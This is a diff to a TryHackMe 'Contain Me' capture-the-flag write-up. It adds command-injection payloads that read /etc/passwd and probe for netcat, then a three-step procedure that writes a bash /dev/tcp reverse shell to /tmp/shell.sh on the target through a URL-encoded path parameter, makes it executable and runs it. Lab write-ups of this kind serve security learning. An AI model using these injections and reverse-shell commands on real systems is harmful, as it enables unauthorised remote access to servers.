@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T23:01:07.300+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T23:25:23.629+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -163,7 +163,11 @@ Perhaps the intended attack path is LFI or Command Injection. Lets try a payload
 
 Let's play around and see how far we can push it. 
 
-URL-encoding the **payload** allows me to read the **/etc/passwd**
+### Payload Crafting
+
+**base payload** `curl "http://TARGET_IP/index.php?path=etc;<PAYLOAD>"`
+
+URL-encoding the **end of the payload** allows me to read the **/etc/passwd**
 
 ```
 curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;cat%20..%2F..%2F..%2F..%2Fetc%2Fpasswd"
@@ -200,6 +204,47 @@ curl "http://10.112.132.114/index.php?path=/etc/passwd;which%20nc%20netcat%20nca
 ![](/img/user/Attachments/available-tools.png)
 
 So **python perl and bash** are available which explains why spawning a reverse shell with nc was unsuccessful. 
+
+It is possible to write the bash command to a **.sh** script and write it to the server using the **URL-encoding method** to achieve a reverse shell.
+#### Step 1: Write it to the Server
+
+**Decoded**
+This writes the command from earlier into a .sh script and writes it to the server in the **/tmp** folder
+`/tmp;echo 'bash -i >& /dev/tcp/192.168.141.140/4444 0>&1' > /tmp/shell.sh"`
+
+**Encoded**
+```
+curl "http://10.112.132.114/index.php?path=/tmp;echo%20'bash%20-i%20>%26%20/dev/tcp/192.168.141.140/4444%200>%261'%20>%20/tmp/shell.sh"
+```
+
+![](/img/user/Attachments/write-shell-script-to-server.png)
+
+#### Step 2: Make it Executable
+
+**Decoded**
+`curl"http://10.112.132.114/index.php?path=/tmp;chmod +x /tmp/shell.sh"`
+
+**Encoded**
+```
+curl "http://10.112.132.114/index.php?path=/tmp;chmod%20+x%20/tmp/shell.sh"
+```
+
+![](/img/user/Attachments/make-sh-executable.png)
+
+#### Step 3: Execute it
+
+**Decoded**
+`curl"http://10.112.132.114/index.php?path=/tmp;bash /tmp/shell.sh"`
+
+**Encoded**
+```
+curl "http://10.112.132.114/index.php?path=/tmp;bash%20/tmp/shell.sh"
+```
+
+#### Reverse Shell 
+
+![](/img/user/Attachments/reverse-shell.png)
+
 
 **info.php**
 
